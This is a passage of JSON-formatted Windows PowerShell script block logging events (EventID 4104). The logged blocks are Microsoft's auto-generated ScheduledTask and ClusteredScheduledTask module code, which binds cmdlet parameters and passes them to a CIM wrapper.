throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Stop-ScheduledTask' -Alias '*'\r\n        \r\n",
    "ScriptBlockId": "97e25639-7cba-4b4f-a31d-9b0148eac352",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.010878Z"
    },
    "EventRecordID": 43,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-26A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 1,
    "MessageTotal": 5,
    "ScriptBlockText": "\r\n#requires -version 3.0\r\n\r\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\r\n\r\n$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module\r\n\r\n$script:ClassName = 'Root/Microsoft/Windows/TaskScheduler/PS_ClusteredScheduledTask'\r\n$script:ClassVersion = '1.0'\r\n$script:ModuleVersion = '1.0'\r\n$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]\r\n\r\n$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()\r\n\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function @()\r\n        \r\n\r\nfunction __cmdletization_BindCommonParameters\r\n{\r\n    param(\r\n        $__cmdletization_objectModelWrapper,\r\n        $myPSBoundParameters\r\n    )       \r\n                \r\n\r\n        if ($myPSBoundParameters.ContainsKey('CimSession')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] \r\n        }\r\n                    \r\n\r\n        if ($myPSBoundParameters.ContainsKey('AsJob')) { \r\n            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] \r\n        }\r\n                    \r\n\r\n}\r\n                \r\n\r\nfunction Get-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance[]])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Get0', Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Get0', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Get0', Position=2)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum]\r\n    ${TaskType},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Get0')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Get', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_ClusteredScheduledTask_v1.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Get-ClusteredScheduledTask' -Alias '*'\r\n        \r\n\r\nfunction Register-ClusteredScheduledTask\r\n{\r\n    [CmdletBinding(PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')][OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${InputObject},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=3)]\r\n    [Parameter(ParameterSetName='Params', Position=6)]\r\n    [Parameter(ParameterSetName='Xml', Position=3)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Cluster},\r\n\r\n    [Parameter(ParameterSetName='Object', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=0)]\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=0)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${TaskName},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=1)]\r\n    [Parameter(ParameterSetName='Params', Position=1)]\r\n    [Parameter(ParameterSetName='Xml', Position=1)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum]\r\n    ${TaskType},\r\n\r\n    [Parameter(ParameterSetName='Object', Position=4)]\r\n    [Parameter(ParameterSetName='Params', Position=7)]\r\n    [Parameter(ParameterSetName='Xml', Position=4)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Resource},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=4)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance]\r\n    ${Settings},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=5)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Description},\r\n\r\n    [Parameter(ParameterSetName='Params', Position=3)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Trigger},\r\n\r\n    [Parameter(ParameterSetName='Params', Mandatory=$true, Position=2)]\r\n    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [ciminstance[]]\r\n    ${Action},\r\n\r\n    [Parameter(ParameterSetName='Xml', Mandatory=$true, Position=2, ValueFromPipeline=$true)]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [string]\r\n    ${Xml},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [Alias('Session')]\r\n    [ValidateNotNullOrEmpty()]\r\n    [CimSession[]]\r\n    ${CimSession},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [int]\r\n    ${ThrottleLimit},\r\n\r\n    [Parameter(ParameterSetName='Object')]\r\n    [Parameter(ParameterSetName='Params')]\r\n    [Parameter(ParameterSetName='Xml')]\r\n    [switch]\r\n    ${AsJob})\r\n\r\n    DynamicParam {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\r\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\r\n\r\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\r\n                {\r\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\r\n                }\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n\r\n    Begin {\r\n        $__cmdletization_exceptionHasBeenThrown = $false\r\n        try \r\n        {\r\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\r\n            $__cmdletization_objectModelWrapper.BeginProcessing()\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    Process {\r\n        try \r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\r\n\r\n      switch -exact ($PSCmdlet.ParameterSetName) { \r\n        { @('Object') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('InputObject')) {\r\n          [object]$__cmdletization_value = ${InputObject}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'InputObject'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletizati",
    "ScriptBlockId": "961cd978-8fb5-4f94-aae7-dbef6c97012a",
    "Path": ""
  }
}
{
  "System": {
    "Provider_attributes": {
      "Name": "Microsoft-Windows-PowerShell",
      "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
    },
    "EventID": 4104,
    "Version": 1,
    "Level": 3,
    "Task": 2,
    "Opcode": 15,
    "Keywords": "0x0",
    "TimeCreated_attributes": {
      "SystemTime": "2024-09-01T19:39:20.010896Z"
    },
    "EventRecordID": 44,
    "Correlation_attributes": {
      "ActivityID": "CEDA99A8-FCAE-0000-26A3-DACEAEFCDA01"
    },
    "Execution_attributes": {
      "ProcessID": 5808,
      "ThreadID": 876
    },
    "Channel": "Microsoft-Windows-PowerShell/Operational",
    "Computer": "DESKTOP-PMOIL0D",
    "Security_attributes": {
      "UserID": "S-1-5-21-3783332216-3677135460-475609662-1001"
    }
  },
  "EventData": {
    "MessageNumber": 2,
    "MessageTotal": 5,
    "ScriptBlockText": "on_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n        }\r\n        { @('Params') -contains $_ } {\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskName')) {\r\n          [object]$__cmdletization_value = ${TaskName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Settings')) {\r\n          [object]$__cmdletization_value = ${Settings}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Settings'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskSettings'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Description')) {\r\n          [object]$__cmdletization_value = ${Description}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Trigger')) {\r\n          [object]$__cmdletization_value = ${Trigger}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Trigger'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Cluster')) {\r\n          [object]$__cmdletization_value = ${Cluster}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Action')) {\r\n          [object]$__cmdletization_value = ${Action}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Action'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskAction'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('TaskType')) {\r\n          [object]$__cmdletization_value = ${TaskType}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'TaskType'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.ScheduledTask.ClusterTaskTypeEnum'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Resource')) {\r\n          [object]$__cmdletization_value = ${Resource}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Resource'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('RegisterByParams', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      